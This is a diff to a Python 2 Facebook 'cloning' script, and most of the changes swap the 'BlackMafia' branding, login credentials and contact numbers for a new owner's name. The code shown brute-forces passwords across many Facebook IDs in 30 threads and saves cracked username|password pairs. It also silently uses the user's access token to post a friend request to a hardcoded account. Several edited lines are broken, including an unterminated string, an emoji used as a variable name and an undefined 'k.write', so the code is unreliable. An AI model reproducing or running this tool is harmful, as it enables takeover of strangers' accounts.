@@ -104,8 +104,8 @@ jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin BlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "BlackMafia"
-CorrectPassword = "lovehacker"
+CorrectUsername = "IMTIAZ"
+CorrectPassword = "HYDER"
 
 loop = 'true'
 while (loop == 'true'):
@@ -165,7 +165,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.facebook.com/imtiazali.pitafi.52
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -212,7 +212,7 @@ def menu():
 	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
 	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡  IMTIAZ hyder PITAFI ♡──────────•◈•──────────♡"
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
@@ -269,7 +269,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────╯♡"
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mIMTIAZ hyder Pitafi\033[1;95m♡──────────•◈•──────────╯♡"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -295,13 +295,14 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mIMTIAZ ALI PITAFI\ 033[1;95m♡──────────•◈•──────────♡"
 	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mImtiaz Hyder Pitafi
+					\033[1;95m♡──────────•◈•──────────♡"
 	
 			
 	def main(arg):
-		global cekpoint,oks
+		global 🆗,oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -317,9 +318,9 @@ def pilih_super():
 				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
 			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
-					cek = open("out/checkpoint.txt", "a")
+				if 'www.facebook.com' in q["ok_msg"]:
+					print '\x1b[1;95msuccsesfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
+					cek = open("out/succsesfull.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
@@ -331,10 +332,10 @@ def pilih_super():
 						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
 						oks.append(user+pass2)
 					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
-							cek = open("out/checkpoint.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
+						if 'www.facebook.com' in q["ok_msg"]:
+							print '\x1b[1;95msuccsesfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
+							cek = open("out/succsesfull.txt", "a")
+							k.write(user+"|"+pass2+"\n")
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
@@ -345,9 +346,9 @@ def pilih_super():
 								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
 								oks.append(user+pass3)
 							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
-									cek = open("out/checkpoint.txt", "a")
+								if 'www.facebook.com' in q["ok_msg"]:
+									print '\x1b[1;95mSuccsesfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
+									cek = open("out/succsesfull.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
 									cekpoint.append(user+pass3)
@@ -359,9 +360,9 @@ def pilih_super():
 										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
 										oks.append(user+pass4)
 									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
-											cek = open("out/checkpoint.txt", "a")
+										if 'www.facebook.com' in q["ok_msg"]:
+											print '\x1b[1;95msuccsesfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
+											cek = open("out/succsesfull.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
 											cekpoint.append(user+pass4)
@@ -416,7 +417,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mIMTIAZ HYDER PITAFI \033[1;95m♡──────────•◈•──────────♡"
 	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:love_hacker
 	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
@@ -427,10 +428,10 @@ def pilih_super():
              [███████████████]
              ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
 ♡──────────────•◈•──────────────♡.
-: \033[1;96m .....lovehacker  BlackMafia........... \033[1;93m :
+: \033[1;96m .....H4CKER482  IMTIAZ HYDER........... \033[1;93m :
 ♡──────────────•◈•──────────────♡.' 
                 whatsapp Num
-               +923094161457"""
+                 03097450952"""
 	
 	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
 	menu()
